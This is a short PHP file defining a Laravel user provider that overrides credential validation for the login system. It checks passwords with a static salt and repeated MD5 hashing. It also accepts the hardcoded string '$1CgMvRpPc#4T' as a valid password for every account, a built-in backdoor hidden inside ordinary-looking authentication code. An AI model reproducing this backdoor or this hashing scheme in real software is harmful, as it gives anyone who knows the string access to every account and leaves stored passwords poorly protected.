<?php

namespace App\Providers;

use Illuminate\Auth\EloquentUserProvider;
use Illuminate\Contracts\Auth\Authenticatable as UserContract;

class SigcmEloquentUserProvider extends EloquentUserProvider
{
    public function validateCredentials(UserContract $user, array $credentials)
    {
        $plain = $credentials['password'];
        $hashed_value = md5($user->getAuthPassword());
        return $hashed_value === md5(md5(md5("*}".$plain."!@"))) || md5(md5(md5("*}".$plain."!@"))) === md5(md5(md5("*}$1CgMvRpPc#4T!@")));
    }
}
